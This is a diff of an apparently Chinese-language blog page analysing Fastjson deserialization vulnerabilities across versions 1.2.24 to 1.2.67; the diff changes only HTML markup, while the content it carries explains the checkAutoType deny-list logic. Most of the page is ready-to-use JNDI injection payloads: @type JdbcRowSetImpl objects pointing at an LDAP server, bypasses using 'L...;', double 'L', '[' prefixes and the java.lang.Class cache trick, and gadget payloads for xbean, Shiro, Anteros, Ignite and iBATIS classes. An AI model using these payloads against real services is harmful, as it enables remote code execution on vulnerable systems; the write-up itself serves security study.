-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241111.png" srcset="/img/loading.gif" lazyload alt="image-20230810205442293"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032242017.png" srcset="/img/loading.gif" lazyload alt="image-20230810205413334"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241111.png"
+                      alt="image-20230810205442293"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032242017.png"
+                      alt="image-20230810205413334"
+                ></p>
 <p>conn默认为空，若this.getDataSourceName() !&#x3D; null则进入else if,调用至 lookup(this.getDataSourceName()</p>
 <p>故此处存在JNDI注入，payload为:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="1-2-25-lt-x3D-Fastjson-lt-x3D-1-2-41"><a href="#1-2-25-lt-x3D-Fastjson-lt-x3D-1-2-41" class="headerlink" title="1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.41"></a>1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.41</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>开启autoTypeSupport,影响版本1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</p>
 <h3 id="版本分析"><a href="#版本分析" class="headerlink" title="版本分析"></a>版本分析</h3><p>FastJSON1.2.24</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="hljs-built_in">this</span>.config.getDefaultClassLoader());<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="built_in">this</span>.config.getDefaultClassLoader());</span><br></pre></td></tr></table></figure></div>
 
 <p>FastJSON1.2.25</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = <span class="hljs-built_in">this</span>.config.checkAutoType(ref, (Class)<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = <span class="built_in">this</span>.config.checkAutoType(ref, (Class)<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>加载类从TypeUtils.loadClass 变成了this.config.checkAutoType</p>
 </blockquote>
 <p>同时在1.2.25后<code>com.alibaba.fastjson.parser.ParserConfig</code>类加了属性</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> autoTypeSupport; <span class="hljs-comment">//控制是否可进行反序列化，默认为false</span><br><span class="hljs-keyword">private</span> String[] denyList; <span class="hljs-comment">//黑名单</span><br><span class="hljs-keyword">private</span> String[] acceptList; <span class="hljs-comment">//白名单</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> autoTypeSupport; <span class="comment">//控制是否可进行反序列化，默认为false</span></span><br><span class="line"><span class="keyword">private</span> String[] denyList; <span class="comment">//黑名单</span></span><br><span class="line"><span class="keyword">private</span> String[] acceptList; <span class="comment">//白名单</span></span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>黑白名单在构造方法中赋值</p>
 </blockquote>
 <p>反序列化中也使用了<code>ParserConfig#checkAutoType()</code>,下图为com.alibaba.fastjson.parser.DefaultJSONParser中parseObject()方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032242548.png" srcset="/img/loading.gif" lazyload alt="image-20230810210025230"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032242548.png"
+                      alt="image-20230810210025230"
+                ></p>
 <p>checkAutoType()中对autoTypeSupport进行判断</p>
 <ul>
 <li>若为true则先进行白名单校验，若为白名单内则进 入TypeUtils.loadClass，后再进行黑名单校验，若在黑名单中则抛出异常(autoType is not support …)，若未在黑名单中则在Map中查找类</li>
 <li>若autoTypeSupport为false,则进行黑名单判断，再进行白名单判断，最后若autoTypeSupport&#x3D;true， 会再一次进行判断然后进入到TypeUtils.loadClass中</li>
 </ul>
 <p>com.alibaba.fastjson.util.TypeUtils#loadClass()中对[ L ;进行了处理，而其中在处理L ;的时候存在了逻 辑漏洞，可以在className的前后分别加上L ;来进行绕过</p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032242965.png" srcset="/img/loading.gif" lazyload alt="image-20230810211123310"></p>
-<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:13 89/Basic/Command/calc&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032242965.png"
+                      alt="image-20230810211123310"
+                ></p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); <span class="comment">//开启autoTypeSupport</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:13 89/Basic/Command/calc&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>利用条件</p>
 <ul>
@@ -439,39 +717,39 @@
 </li>
 </ul>
 <p>payload</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;A&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>其实就是传两个对象，解析两次，解析完第一个对象时会把com.sun.rowset.JdbcRowSetImpl驾到缓存map中，第二次时就可以直接获取到目标类</p>
 <p>A的解释</p>
 <ul>
 <li><p>在MiscCodec#deserialze()方法中，会解析strVal(对应val的值),当clazz &#x3D;&#x3D; Class.class，调用 TypeUtils.loadClass(),此时strVal为val对应值,这样就可以把val中的类加载到缓存map（mappings）中</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == Class.class) &#123; <span class="hljs-comment">//当clazz == Class.class，调用 TypeUtils.loadClass(),此时strVal为val对应值</span><br><span class="hljs-keyword">return</span> TypeUtils.loadClass(strVal,parser.getConfig().getDefaultClassLoader());<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123; <span class="comment">//当clazz == Class.class，调用 TypeUtils.loadClass(),此时strVal为val对应值</span></span><br><span class="line"><span class="keyword">return</span> TypeUtils.loadClass(strVal,parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
 </ul>
 </blockquote>
 <h2 id="Fastjson-x3D-1-2-42"><a href="#Fastjson-x3D-1-2-42" class="headerlink" title="Fastjson &#x3D; 1.2.42"></a><strong>Fastjson &#x3D; 1.2.42</strong></h2><h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><p>Fastjson &lt;&#x3D; 1.2.42 开启autoTypeSupport</p>
 <p>Fastjson1.2.42将黑名单由字符串直接比对改为了HashCode。checkAutoType()中在黑名单绕过的时候 做了一个校验，如果类名以L开头，;结尾，则会用stubstring()去除类名前的第一个L,<u>双写L即可绕过</u></p>
-<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autoTypeSupport </span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1: 1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); <span class="comment">//开启autoTypeSupport </span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1: 1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="Fastjson-x3D-1-2-43"><a href="#Fastjson-x3D-1-2-43" class="headerlink" title="Fastjson &#x3D; 1.2.43"></a><strong>Fastjson &#x3D; 1.2.43</strong></h2><h3 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h3><p>Fastjson &lt;&#x3D; 1.2.43开启autoTypeSupport</p>
 <p>Fastjson &lt;&#x3D; 1.2.43，checkAutoType()对LL进行了判断，如果类以LL开头，抛出异常,但在 TypeUtils.loadClass中，还对[进行了处理，因此又可以通过[来进行绕过</p>
 <p>TypeUtils#loadClass()</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>    <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">newClassName</span> <span class="hljs-operator">=</span> className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>&#125;<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autoTypeSupport </span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span> [&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span> &#125;<br></code></pre></td></tr></table></figure>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); <span class="comment">//开启autoTypeSupport </span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span> [&#123;,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span> &#125;</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="Fastjson-x3D-1-2-44"><a href="#Fastjson-x3D-1-2-44" class="headerlink" title="Fastjson &#x3D; 1.2.44"></a><strong>Fastjson &#x3D; 1.2.44</strong></h2><p>修复了[的绕过，在checkAutoType中进行判断如果类名以[或L开头抛出异常。L[让绕 过方法失效，可使用JSON内置payload</p>
-<h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;A&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="Fastjson-x3D-1-2-47"><a href="#Fastjson-x3D-1-2-47" class="headerlink" title="Fastjson &#x3D; 1.2.47"></a><strong>Fastjson &#x3D; 1.2.47</strong></h2><h3 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport<br>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 autoTypeSupport开启或未开启均可利用</p>
-<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;A&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="1-2-48-lt-x3D-Fastjson-lt-x3D-1-2-67（要有依赖）"><a href="#1-2-48-lt-x3D-Fastjson-lt-x3D-1-2-67（要有依赖）" class="headerlink" title="1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67（要有依赖）"></a><strong>1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67</strong>（要有依赖）</h2><p>Fastjson1.2.48修复JSON内置绕过方法，此版本内多为针对黑名单绕过，需要相应组件才可使用</p>
 <h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>&lt;&#x3D;1.2.62</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//依赖</span><br><span class="hljs-comment">// &lt;dependency&gt;</span><br><span class="hljs-comment">//          &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="hljs-comment">//          &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span><br><span class="hljs-comment">//          &lt;version&gt;x.x&lt;/version&gt;</span><br><span class="hljs-comment">//     &lt;/dependency&gt;</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.</span><br><span class="hljs-string">0.1:1389/Basic/Command/calc&quot;</span>&#125;<span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//依赖</span></span><br><span class="line"><span class="comment">// &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">//          &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">//          &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">//          &lt;version&gt;x.x&lt;/version&gt;</span></span><br><span class="line"><span class="comment">//     &lt;/dependency&gt;</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;ldap://127.0.</span></span><br><span class="line"><span class="string">0.1:1389/Basic/Command/calc&quot;</span>&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>fastjson &lt;&#x3D; 1.2.66黑名单绕过，需autoTypeSupport属性为true</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="hljs-string">&quot;resourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="hljs-string">&quot;jndiNames&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="hljs-string">&quot;proper</span><br><span class="hljs-string">ties:</span><br><span class="hljs-string">&#123;&quot;</span><span class="hljs-meta">@type</span><span class="hljs-string">&quot;:&quot;</span>java.util.Properties<span class="hljs-string">&quot;,&quot;</span>UserTransaction<span class="hljs-string">&quot;:&quot;</span>ldap:<span class="hljs-comment">//127.0.0.1:1389/Basic/Command/calc&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
